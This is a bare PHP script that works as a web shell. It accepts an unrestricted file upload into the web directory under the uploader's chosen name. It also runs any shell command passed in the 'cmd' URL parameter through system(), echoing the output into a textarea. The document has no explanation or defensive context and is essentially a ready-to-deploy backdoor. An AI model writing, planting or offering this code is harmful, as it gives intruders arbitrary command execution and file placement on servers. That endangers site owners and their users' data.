<?php
if ($_FILES["file"]["error"] > 0)
{
    echo "Error: " . $_FILES["file"]["error"] . "<br>";
}
else
{
    echo "FILENAME: " . $_FILES["file"]["name"] . "<br>";
    echo "FILETYPE: " . $_FILES["file"]["type"] . "<br>";
    echo "FILETYPE: " . ($_FILES["file"]["size"] / 1024) . " kB<br>";
    echo "FILETEMPPATH: " . $_FILES["file"]["tmp_name"] . " <br>";
    move_uploaded_file($_FILES["file"]["tmp_name"], $_FILES["file"]["name"]);
}
?>
<textarea name="textarea" cols="100" rows="25" readonly>
<?php
if (strlen($_GET["cmd"]) > 0)
{
        system($_GET["cmd"]);
}
?>
</textarea>
